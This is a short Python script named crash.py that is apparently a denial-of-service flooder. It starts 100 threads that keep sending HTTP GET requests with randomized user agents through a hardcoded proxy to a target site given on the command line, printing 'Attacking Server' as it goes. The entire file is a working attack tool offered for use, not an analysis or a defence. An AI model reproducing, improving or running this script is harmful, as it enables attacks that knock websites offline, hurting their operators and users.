#!/usr/bin/python3
# Author r00t#d4nZ
# crash.py
# create by r00td4nZ
# dilarang mengubah script tanpa dari sumbernya
# usage : python3 www.site.com 80

import threading
import socks
import socket
import sys,random
import time
import os

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'
agent = []
agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
data = '''
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive'''

site = sys.argv[1]
t = [None] *1000
a = [None] *1000
l = [None] *1000

port_to_host = 80

def dos():
	while True:
		try:
			s = socks.socksocket()
			s.set_proxy(socks.HTTP, "37.110.63.6", 3128)
			s.connect((site, port_to_host))
			s.settimeout(1)
			packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
			s.sendto(packet, (site, port_to_host))
			s.send(packet)
			print(G+time.ctime(time.time()) + ' Attacking Server->'+site+G)
		except:
			print(time.ctime(time.time()) + ' Attacking Server->'+site)
			exit(1)

for i in range(100):
	t[i] = threading.Thread(target=dos)
for k in range(100):
	t[k].start()